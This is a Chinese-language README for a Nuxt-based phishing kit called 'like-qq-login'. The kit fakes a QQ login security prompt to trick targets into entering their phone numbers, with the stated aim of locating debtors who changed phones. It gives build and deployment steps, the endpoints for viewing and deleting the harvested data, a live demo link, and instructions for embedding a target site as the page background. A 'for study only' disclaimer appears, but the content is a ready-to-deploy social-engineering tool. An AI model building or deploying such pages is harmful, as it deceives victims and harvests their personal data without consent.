# like-qq-login

## 作用
为了催收欠款用户（老赖）换手机后的问题，并无其它恶意行为。

## 思路
部署好之后，发送网页链接给目标用户，让其在页面上误以为需要QQ登录，页面引导提示账号不安全，让用户输入手机号，从而获取到用户手机号。

## 演示地址

> 填写真实信息时，记得清空数据，信息泄露后果自负


主页：<a href="https://cbcb.site" target="_blank">http://cbcb.site</a>

查看：<a href="https://cbcb.site" target="_blank">http://cbcb.site/cbcb/show</a>

清空：<a href="https://cbcb.site" target="_blank">http://cbcb.site/cbcb/delete</a>

## 效果

![4554fb731b9d71a68a85dd27d4d5943](https://user-images.githubusercontent.com/32216292/200274398-75c675b8-0fc7-4483-ac7e-117d53795214.jpg)

![d2b978f13e6a0c6169750a61f9e5893](https://user-images.githubusercontent.com/32216292/200274473-10125dae-b21e-4324-b6d0-35ef6e6d3e42.png)

![b69b1f37e371516e32e8a22ee961f4a](https://user-images.githubusercontent.com/32216292/200274545-4af6962d-90a3-4884-8a56-f618e5b9083c.jpg)

## 查看数据
```
// 请根据您实际的地址来，在浏览器访问
localhost:3000/cbcb/show
```
![b69b1f37e371516e32e8a22ee961f4a](https://user-images.githubusercontent.com/32216292/200274545-4af6962d-90a3-4884-8a56-f618e5b9083c.jpg)
## 清空数据
```
// 请根据您实际的地址来，在浏览器访问
localhost:3000/cbcb/delete
```

## 改变背景
```
// 在 pages/index.vue 页面，找到 embed， src 换成目标网站URL即可
<embed v-if="loadEmbed" src="http://youself.site" width="100%" class="h-screen"/>
```

## 修改标题
```ts
// 修改 nuxt.config.ts
...
 app:{
        head:{
            title: "输入标题",
            meta: [
                { name: 'description', content: '标题描述' },
            ],
        }
    },
 ..

```
## 声明
仅供学习参考

## 使用方式

```bash
# 安装 node.js 后，全局安装 yarn
npm install -g yarn

# yarn
yarn install
```

## 开发模式，默认 3000 端口

开发模式下，默认3000： http://localhost:3000

```bash
yarn dev
```

## 编译，用于正式环境
```bash
yarn build
```

## 执行编译文件
```bash
node .output/server/index.mjs
```

nuxt 文档 [nuxt3](https://nuxt.com/).

## 使用 pm2

```bash
# 编译后，才能正常启动
pm2 start .\ecosystem.config.js
```

